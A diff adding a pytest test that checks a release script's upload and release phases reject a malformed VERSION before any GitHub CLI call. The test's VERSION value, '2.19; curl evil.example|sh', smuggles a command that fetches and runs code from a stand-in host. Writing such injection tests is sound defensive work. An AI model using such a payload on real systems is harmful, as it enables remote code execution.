@@ -74,3 +74,25 @@ def test_assets_is_idempotent(tmp_path):
     assert run(dist, False).returncode == 0
     assert run(dist, False).returncode == 0, "second run must not duplicate checksums"
     assert len((dist / "SHA256SUMS").read_text().splitlines()) == 1
+
+def test_upload_and_release_reject_malformed_version_before_any_gh_call(tmp_path):
+    # A crafted VERSION reaches jq programs and release ids — validate at the
+    # door (security review). PATH contains only grep, so any gh invocation
+    # would fail with 127; the guard must fire first with a clear error.
+    import os, shutil, tempfile
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    (bindir / "bash").symlink_to(shutil.which("bash"))
+    (bindir / "grep").symlink_to(shutil.which("grep"))
+    for phase in ("upload", "release"):
+        env = {
+            "PATH": str(bindir),
+            "GITHUB_REPOSITORY": "retropack/x",
+            "VERSION": "2.19; curl evil.example|sh",
+            "GH_TOKEN": "x",
+            "DIST": str(tmp_path / "dist"),
+        }
+        r = subprocess.run(["bash", str(SCRIPT), phase], env=env,
+                           capture_output=True, text=True)
+        assert r.returncode == 1, f"{phase}: rc={r.returncode}, stderr={r.stderr}"
+        assert "invalid version" in r.stderr, r.stderr
